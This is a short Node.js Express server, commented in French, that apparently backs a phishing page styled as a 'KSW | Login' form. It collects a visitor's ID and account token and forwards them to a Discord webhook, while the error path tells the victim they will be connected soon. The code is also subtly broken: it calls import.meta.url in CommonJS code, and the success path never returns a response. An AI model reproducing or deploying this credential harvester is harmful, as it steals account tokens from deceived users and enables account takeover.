const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const { fileURLToPath } = require('url');
const { config } = require('./config.js');

const app = express();
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Middleware pour parser les données du formulaire
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve le formulaire HTML à la racine
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route pour traiter l'envoi du formulaire et envoyer à Discord
app.post('/send-to-discord', (req, res) => {
    const { username, message } = req.body;

    if (!username || !message) {
        return res.status(400).json({ error: 'Nom et message sont requis.' });
    }

    const embed = {
        content: null,
        embeds: [
            {
                title: '<:IconInvite:1303508250473402429>〃KSW | Login',
                description: `**__Id__**: ${username}\n__**Token**__: ${message}`,
                color: 0,
                timestamp: new Date().toISOString(),
            },
        ],
    };

    // Envoi du message à Discord via le webhook
    fetch(config.DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed),
    })
        .then((response) => {
            if (!response.ok) {
                return res.status(500).json({ error: 'Nous allons te connecter prochainement' });
            }
        })
});

// Route pour afficher la page de remerciement
app.get('/thanks', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'thanks.html'));
});

// Démarrer le serveur sur le port fourni par Render
const port = process.env.PORT || 3000;  // Utilisez le port dynamique ou 3000 par défaut
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

